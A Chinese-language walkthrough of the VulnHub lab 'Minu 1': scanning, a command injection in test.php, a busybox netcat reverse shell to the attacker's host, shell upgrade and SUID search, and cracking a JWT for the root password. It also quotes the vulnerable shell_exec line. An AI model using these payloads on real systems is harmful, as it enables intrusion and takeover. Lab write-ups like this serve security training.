# Minua  
https://www.vulnhub.com/entry/minu-1,235/
## 服务发现和信息收集    
### 扫描信息  
```
nmap -PR 192.168.1.*  
nmap -A  -p 1-65535 192.168.1.65 
```      
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200223202042.png)  
只开启了80端口，很让人疑惑，那登录吧  
**扫描目录**  
```
python3 dirsearch.py -e php -u http://192.168.1.65/
```  
存在一个test.php  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200223202403.png)  
打开这个网页里提示了本地的浏览器端的数据  
点击最下面的Read last visitor data的功能是查询之前的访问记录  
其中文件包含了这个文件
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200223202444.png)  

**抓包**  
抓包下来也是十分正常的包，那么之前的本地文件包含问题  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200223202837.png)  
**本地文件包含**  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200223211254.png) 
汗~  
好像不存在LFI啊！ 
 **通用漏洞**  
 因为只有apache的信息所以搜索apache的漏洞  
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200223215457.png)  
 ***  
 看了下wp，原来是来自于命令执行漏洞  
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200223215745.png)  
 那么直接在其中输入反弹  shell吧  
 
## 漏洞利用  
[Linux二进制提权](https://gtfobins.github.io/gtfobins/busybox/)  
使用busybox进行提权  
```  
直接在网站当中执行的命令是 busybox nc 192.168.1.39 1234 -e sh -i   
busybox 后面直接执行命令 -e 是返回的程序 -i 是交互式地进行  


http://192.168.1.65/test.php？file=default.php;busybox%20nc%20192.168.1.39%201234%20-e%20sh%20-i
```   
返回了一个可交互的shell  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200223222132.png)  
使用python3返回的交互式shell  
``` 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
```   
寻找s位的命令  
```
find / -perm -u=s -type f 2>/dev/null   
```
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200223222810.png)
**在/home/bob发现一个隐藏文件**  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200223223629.png)  
直接使用john进行破解  
```
leafpad x #写入 
john x
```
 ***
 破解出来算我输，原来是JWT文件（新手那里一看这个知道是JWT？）  
 直接使用JWT工具进行破解 
[JWT工具](https://github.com/brendan-rius/c-jwt-cracker)    
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200223225606.png)  
提权成功结束  


## 总结  
利用前端的命令执行，配合上受限的shell返回一个普通的shell  
翻看文件拿到一个JWT解密之后就得到了root密码  

**提出问题**  
busybox 绕过的由来以及是否存在其他方法进行绕过
JWT的解密以及使用场景
如果不能产生交互式shell 如何进行下一步？
[另外一种思路](https://hackso.me/minu-1-walkthrough/)  
查看出现问题的代码  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200229210750.png)
<?php echo shell_exec('cat ' . $_GET['file']);?>
所以使用;可以使得命令截断  
